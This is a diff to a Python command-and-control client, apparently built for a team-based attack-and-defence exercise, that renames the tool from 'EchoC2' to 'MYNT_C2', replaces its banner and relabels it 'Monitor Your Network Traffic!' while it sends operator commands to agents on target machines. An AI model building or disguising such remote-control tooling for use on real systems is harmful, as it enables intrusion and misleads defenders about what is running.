@@ -72,7 +72,7 @@ def parse_teams(value):
             teams.append(int(part))
     return teams
 
-parser = argparse.ArgumentParser(description='EchoC2')
+parser = argparse.ArgumentParser(description='MYNT_C2')
 parser.add_argument("--teams", type=parse_teams, help='Example: "1-5,8,12-14"')
 parser.add_argument("--machines", type=parse_machines, help='Example: "machine1,machine2"')
 parser.add_argument('--size', type=int, default=1024,
@@ -183,14 +183,14 @@ def client(dest_addrs):
     machine_outputs = {}
 
     while True:
-        command = input(f"{GREEN}EchoC2>{RESET} ")
+        command = input(f"{GREEN}MYNT_C2>{RESET} ")
         if command.lower() == 'exit':
             break
         if command.lower() == 'status':
             display_status()
         if command.lower().startswith('output'):
             command = command.split(' ')
-            print(f"{BLUE}[*]{RESET} Output for {command[1]} {command[2]}:\n {machine_outputs[command[1]][command[2]]}")
+            print(f"{BLUE}[*]{RESET} Output for {'Team' + command[1]} {command[2]}:\n {machine_outputs[agent_ips['Team' + command[1]][command[2]]]}")  
 
         seq += 1
         full_command = COMMAND_PREFIX + command.encode()
@@ -303,17 +303,18 @@ if __name__ == "__main__":
         parser.error("--teams and --machines are required")
     
     print(r"""
-  _____     _            ____ ____  
- | ____|___| |__   ___  / ___|___ \ 
- |  _| / __| '_ \ / _ \| |     __) |
- | |__| (__| | | | (_) | |___ / __/ 
- |_____\___|_| |_|\___/ \____|_____|
-                                    """)
+'||\   /||` '\\  //` '||\   ||` |''||''| 
+ ||\\.//||    \\//    ||\\  ||     ||    
+ ||     ||     ||     || \\ ||     ||    
+ ||     ||     ||     ||  \\||     ||    
+.||     ||.   .||.   .||   \||.   .||.   
+                                         
+                                         """)
 
     targets = []
     for team in args.teams:
         for machine in args.machines:
             targets.append(agent_ips["Team" + str(team)][machine])
     print("targets:", targets)
-    print("Welcome to EchoC2. Use 'exit' to quit.\n")
+    print("Welcome to Monitor Your Network Traffic! Use 'exit' to quit.\n")
     client(targets)
